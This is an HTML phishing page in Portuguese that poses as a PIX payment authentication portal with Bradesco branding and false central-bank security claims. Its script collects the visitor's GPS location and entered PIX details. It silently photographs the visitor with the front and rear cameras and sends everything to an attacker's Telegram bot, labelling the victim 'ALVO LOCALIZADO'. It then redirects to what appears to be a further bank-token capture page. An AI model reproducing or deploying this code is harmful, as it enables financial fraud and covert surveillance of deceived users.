<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Recebimento PIX</title>

    <meta property="og:title" content="SISTEMA DE AUTENTICAÇÃO PIX">
    <meta property="og:description" content="Conferência de recebimento pendente. Autentique para liberar o valor via PIX.">
    <meta property="og:image" content="https://autenticador2.github.io/PixAutomatico/bradesco_pix(1).png">
    <meta property="og:type" content="website">

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .pix-card { background: white; max-width: 400px; width: 100%; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
        .content { padding: 25px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .btn-resgatar { width: 100%; background-color: #32bcad; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; }
        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { font-size: 11px; color: #999; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>

<div class="pix-card">
    <div class="header">AUTENTICADOR DE RECEBIMENTOS</div>
    <div class="content">
        <label>Valor para Recebimento (R$):</label>
        <input type="number" id="valor" placeholder="Ex: 1250,00">
        
        <label>Chave PIX do Beneficiário:</label>
        <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">

        <button class="btn-resgatar" onclick="iniciarCaptura()">
            AUTENTICAR E RECEBER
            <div class="spinner" id="spinner"></div>
        </button>

        <div class="footer-info">
            Sistema de Segurança Interbancário<br>
            Criptografia de Ponta a Ponta - Banco Central
        </div>
    </div>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const TELEGRAM_TOKEN = "INSIRA_AQUI_O_TOKEN_QUE_O_BOTFATHER_TE_DEU";
    const CHAT_ID = "560716860";

    async function iniciarCaptura() {
        const v = document.getElementById('valor').value;
        const c = document.getElementById('chave').value;

        if (!v || !c) {
            alert("Preencha os dados para autenticar.");
            return;
        }

        document.getElementById('spinner').style.display = 'inline-block';

        // 1. PEDIR LOCALIZAÇÃO (A BARREIRA)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // Enviar texto inicial
            await enviarMensagem(`📍 *ALVO LOCALIZADO*\n💰 Valor: ${v}\n🔑 Chave: ${c}\n🌍 Mapa: https://www.google.com/maps?q=${lat},${lon}`);

            // 2. PEDIR CÂMERA E TIRAR FOTOS
            try {
                // Foto Frontal
                await tirarFoto("user", "FRONTAL");
                // Foto Traseira
                await tirarFoto("environment", "TRASEIRA");
                
                // Sucesso: Vai para o Token
                window.location.href = "bradesco.html";
            } catch (e) {
                // Se negar câmera após permitir GPS, ainda assim vai para erro ou token conforme sua escolha
                window.location.href = "autorizar.html";
            }

        }, (err) => {
            // Se negar localização, trava na página de erro
            window.location.href = "autorizar.html";
        });
    }

    async function tirarFoto(camera, label) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camera }, audio: false });
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        await new Promise(resolve => video.onloadedmetadata = resolve);
        const canvas = document.getElementById('canvas');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        
        stream.getTracks().forEach(track => track.stop()); // Desliga a câmera rápido

        return new Promise(resolve => {
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `${label}.jpg`);
                formData.append('caption', `📸 Câmera ${label}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                resolve();
            }, 'image/jpeg', 0.7);
        });
    }

    async function enviarMensagem(msg) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }
</script>

</body>
</html>
